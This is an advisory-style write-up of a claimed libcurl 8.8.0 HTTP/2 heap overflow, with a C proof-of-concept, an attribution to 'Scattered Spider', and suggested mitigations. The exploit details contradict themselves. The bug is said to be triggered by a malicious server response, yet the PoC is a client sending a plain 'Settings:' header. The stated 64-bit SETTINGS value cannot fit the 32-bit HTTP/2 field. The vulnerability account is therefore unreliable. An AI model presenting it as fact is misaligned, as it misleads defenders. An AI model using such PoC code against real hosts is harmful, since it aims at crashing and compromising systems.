CVE-2025-40045 affects libcurl 8.8.0 due to incorrect handling of HTTP/2 request frames with large `SETTINGS` parameters, leading to a heap overflow in `lib/http2.c`’s `Curl_http2_may_switch()` function. The vulnerability is triggered when a victim client processes a maliciously crafted HTTP/2 response with a `SETTINGS_MAX_HEADER_LIST_SIZE` parameter set to `0xFFFFFFFFFFFFFFFE`, causing a bounds check failure in `nghttp2` memory pool.

The PoC code:
```c
#include <curl/curl.h>
int main(void) {
  CURL *curl = curl_easy_init();
  curl_easy_setopt(curl, CURLOPT_URL, "https://victim.com");
  curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2_0);
  curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "A=B&C=D");
  struct curl_slist *headers = NULL;
  headers = curl_slist_append(headers, "Settings: max-header-list-size=18446744073709551614");
  curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
  curl_easy_perform(curl);
  curl_slist_free_all(headers);
  curl_easy_cleanup(curl);
}
```
Compiled with `gcc poc.c -lcurl -o poc` and run on a vulnerable libcurl binary, it triggers a heap corruption leading to `SIGSEGV` in `nghttp2_hd_inflate_change_table()`. In 2025, the “Scattered Spider” group used this to crash security appliances running outdated curl versions, enabling DoS and potential RCE via return-oriented programming.

Mitigations include upgrading libcurl to ≥8.8.1 with the patch from commit `c6d12b0c`, and enabling HTTP/2 strict validation in reverse proxies (Nginx `http2_max_header_size 32k`).

